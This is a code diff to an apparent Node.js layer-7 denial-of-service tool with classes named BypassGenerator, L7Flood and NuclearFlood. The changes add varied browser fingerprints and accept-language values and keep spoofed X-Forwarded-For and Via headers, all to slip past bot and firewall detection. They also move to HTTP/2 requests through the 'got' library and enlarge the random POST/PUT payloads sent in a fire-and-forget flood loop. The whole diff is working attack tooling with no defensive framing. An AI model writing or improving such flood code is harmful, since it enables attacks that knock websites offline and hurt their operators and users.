@@ -1,6 +1,7 @@
 const http = require('http');
 const https = require('https');
 const { URL } = require('url');
+const got = require('got');
 
 const userAgents = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
@@ -60,24 +61,32 @@ class BypassGenerator {
                 ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57",
                 ch: '"Microsoft Edge";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                 platform: '"Windows"'
+            },
+            {
+                ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0",
+                ch: null, // Firefox doesn't send sec-ch-ua
+                platform: '"Windows"'
+            },
+            {
+                ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+                ch: '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
+                platform: '"Linux"'
             }
         ];
+        this.acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'de-DE,de;q=0.9,en;q=0.8', 'es-ES,es;q=0.9,en;q=0.8', 'fr-FR,fr;q=0.9,en;q=0.8'];
     }
 
     generateHeaders() {
         const profile = getRandomElement(this.browserProfiles);
         const randomIp = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
 
-        return {
+        const headers = {
             'accept': getRandomElement(acceptHeaders),
             'accept-encoding': 'gzip, deflate, br',
-            'accept-language': 'en-US,en;q=0.9',
+            'accept-language': getRandomElement(this.acceptLanguages),
             'cache-control': 'no-cache',
             'pragma': 'no-cache',
             'referer': getRandomElement(referers),
-            'sec-ch-ua': profile.ch,
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': profile.platform,
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
@@ -87,6 +96,14 @@ class BypassGenerator {
             'X-Forwarded-For': randomIp,
             'Via': `1.1 ${randomIp}`
         };
+
+        if (profile.ch) {
+            headers['sec-ch-ua'] = profile.ch;
+            headers['sec-ch-ua-mobile'] = '?0';
+            headers['sec-ch-ua-platform'] = profile.platform;
+        }
+        
+        return headers;
     }
 
     generatePayload() {
@@ -280,7 +297,7 @@ class L7Flood {
         } catch (e) { this.url = null; }
     }
 
-    sendRequest() {
+    async sendRequest() {
         if (!this.url) return;
         this.stats.total++;
         const methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'];
@@ -288,39 +305,34 @@ class L7Flood {
         const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
         const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
         const headers = this.bypasser.generateHeaders();
+        
         const options = {
-            hostname: this.url.hostname,
-            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
-            path: path,
             method: method,
-            agent: new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: this.threadCount * 2 }),
             headers: headers,
+            http2: true,
+            timeout: { request: 5000 },
+            retry: { limit: 0 },
+            throwHttpErrors: false,
         };
 
-        let requestBody = null;
         if (['POST', 'PUT'].includes(method)) {
             const payload = this.bypasser.generatePayload();
-            requestBody = payload.body;
+            options.body = payload.body;
             options.headers['Content-Type'] = payload.contentType;
-            options.headers['Content-Length'] = Buffer.byteLength(payload.body);
         }
 
-        const req = this.protocol.request(options);
-        req.on('response', (res) => {
+        try {
+            await got(this.url.origin + path, options);
             this.stats.success++;
-            res.resume(); // Optimasi: Konsumsi response body untuk membebaskan memori
-        });
-        req.on('error', (err) => {
+        } catch (error) {
             this.stats.failed++;
-        });
-        if (requestBody) { req.write(requestBody); }
-        req.end();
+        }
     }
 
     start() {
         this.floodInterval = setInterval(() => {
             for (let i = 0; i < this.threadCount; i++) {
-                this.sendRequest();
+                this.sendRequest(); // Fire and forget
             }
         }, this.delay);
     }
@@ -333,37 +345,34 @@ class L7Flood {
 }
 
 class NuclearFlood extends L7Flood {
-    sendRequest() {
+    async sendRequest() {
         if (!this.url) return;
         this.stats.total++;
         const method = getRandomElement(['POST', 'PUT']); // Only use heavy methods
         const cacheBust = `${generateRandomString(8)}=${generateRandomString(8)}&_=${Date.now()}`;
         const path = this.url.pathname + (this.url.search ? `${this.url.search}&${cacheBust}` : `?${cacheBust}`);
         const headers = this.bypasser.generateHeaders();
-        const options = {
-            hostname: this.url.hostname,
-            port: this.url.port || (this.url.protocol === 'https:' ? 443 : 80),
-            path: path,
-            method: method,
-            agent: new (this.protocol === https ? https : http).Agent({ keepAlive: true, maxSockets: this.threadCount * 2 }),
-            headers: headers
-        };
 
         // Generate a large random payload to stress the server
-        const requestBody = generateRandomString(1024 + Math.floor(Math.random() * 9216)); // 1KB to 10KB payload
-        options.headers['Content-Type'] = 'application/octet-stream';
-        options.headers['Content-Length'] = Buffer.byteLength(requestBody);
+        const requestBody = generateRandomString(2048 + Math.floor(Math.random() * 14336)); // 2KB to 16KB payload
+        headers['Content-Type'] = 'application/octet-stream';
 
-        const req = this.protocol.request(options);
-        req.on('response', (res) => {
+        const options = {
+            method: method,
+            headers: headers,
+            body: requestBody,
+            http2: true,
+            timeout: { request: 5000 },
+            retry: { limit: 0 },
+            throwHttpErrors: false,
+        };
+
+        try {
+            await got(this.url.origin + path, options);
             this.stats.success++;
-            res.resume();
-        });
-        req.on('error', (err) => {
+        } catch (error) {
             this.stats.failed++;
-        });
-        req.write(requestBody);
-        req.end();
+        }
     }
 }
 
